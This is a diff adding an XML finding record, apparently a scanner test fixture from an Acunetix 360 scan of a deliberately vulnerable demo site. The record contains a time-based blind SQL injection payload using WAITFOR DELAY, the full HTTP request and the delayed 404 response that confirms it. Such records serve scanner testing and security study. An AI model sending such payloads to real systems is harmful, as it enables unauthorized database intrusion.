@@ -1,0 +1,114 @@
+<vulnerability>
+  <http-request>
+              <method>GET</method>
+                <parameters>
+                    <parameter name="param1" type="UrlRewrite" value="&amp;apos;))&amp;#32;WAITFOR&amp;#32;DELAY&amp;#32;&amp;apos;0:0:25&amp;apos;--" vulnerable="vulnerable" />
+                </parameters>
+              <content><![CDATA[GET /blog/%27))%20WAITFOR%20DELAY%20%270%3a0%3a25%27--/ HTTP/1.1
+  Host: aspnet.testsparker.com
+  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+  Accept-Encoding: gzip, deflate
+  Accept-Language: en-us,en;q=0.5
+  Cache-Control: no-cache
+  Cookie: ASP.NET_SessionId=44lomqqluxhcl2e4yxvrmxsq; TestCookie=Hello
+  Referer: http://aspnet.testsparker.com/Blogs.aspx
+  User-Agent: Mozilla/5.0 (Windows NT 10.0; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+  X-Scanner: Acunetix 360
+
+  ]]></content>
+            </http-request>
+              <http-response>
+                <status-code>404</status-code>
+                <duration>25024.4049</duration>
+                <content><![CDATA[HTTP/1.1 404 Not Found
+  Server: Microsoft-IIS/8.5
+  X-Powered-By: ASP.NET
+  X-AspNet-Version: 4.0.30319
+  Content-Length: 3084
+  Content-Type: text/html; charset=utf-8
+  Date: Tue, 16 Jun 2020 13:15:01 GMT
+  Cache-Control: private
+
+
+
+  <!DOCTYPE html>
+
+  <html xmlns="http://www.w3.org/1999/xhtml">
+  <head><meta http-equiv="content-type" content="text/html; charset=UTF-8" /><meta charset="utf-8" /><title>
+    Bitcoin Web Site
+  </title><meta name="generator" content="Bootply" /><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" /><link href="//maxcdn.bootstrapcdn.com/bootstrap/3.0.3/css/bootstrap.min.css" rel="stylesheet" /><link href="/statics/style.css" rel="stylesheet" />
+      <!--[if lt IE 9]>
+          <script src="//html5shim.googlecode.com/svn/trunk/html5.js"></script>
+      <![endif]-->
+  </head>
+  <body>
+      <div id="resetbar">
+          This website is automatically reset at every midnight (00:00 - UTC).
+      </div>
+      <form method="post" action="" id="form1">
+  <div class="aspNetHidden">
+  <input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUJLTIzMTExOTgyZGSsxJXO6Juz0H9WnmLaZ/ANH9shOpBmzSi1EHH6egImZA==" />
+  </div>
+
+  <div class="aspNetHidden">
+
+    <input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="5C9CE5AE" />
+  </div>
+          <div class="navbar navbar-default">
+              <div class="container">
+                  
+                      <a class="navbar-brand">Bitcoin Web Site</a>
+                      <ul class="nav navbar-nav">
+                          <li><a href="/Default.aspx">Home</a></li>
+                          <li><a href="/Blogs.aspx">Blog</a></li>
+                          <li><a href="/Shop.aspx">Shop</a></li>
+                          <li><a href="/Converter.aspx">Converter & Pricings</a></li>
+                          <li><a href="/Request.aspx?r=/statics/download/">Demo</a></li>
+                          <li><a href="/Help.aspx">Help</a></li>
+                          <li><a href="/Contact.aspx">Contact</a></li>
+                          <li><a href="/administrator/Login.aspx">Login</a></li>
+                      </ul>
+                  
+              </div>
+          </div>
+          <div class="container">
+              <div>
+                  <!-- contentTop -->
+                  
+              </div>
+              <div class="row">
+                  <!-- contentCenterMenu -->
+                  
+      
+
+  <h1>
+      <span id="contentCenterMenu_blogSQLInjection_lblSubject"></span>
+  </h1>
+  <p>
+      <span id="contentCenterMenu_blogSQLInjection_lblDate" style="font-style:italic;"></span>
+  </p>
+  <p>
+      <span id="contentCenterMenu_blogSQLInjection_lblContent"></span>
+  </p>
+
+
+              </div>
+              <hr />
+          </div>
+          <!-- /container -->
+          <!-- script references -->
+          <div id="footer">
+              <div class="container">
+                  
+
+                  <p class="muted credit"><a href="/redirect.aspx?site=bitcoin.org" target="_blank" rel="noopener noreferrer">Bitcoin Foundation.</a></p>
+              </div>
+          </div>
+          <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js"></script>
+          <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.0.3/js/bootstrap.min.js"></script>
+      </form>
+  </body>
+  </html>
+  ]]></content>
+  </http-response>
+</vulnerability>
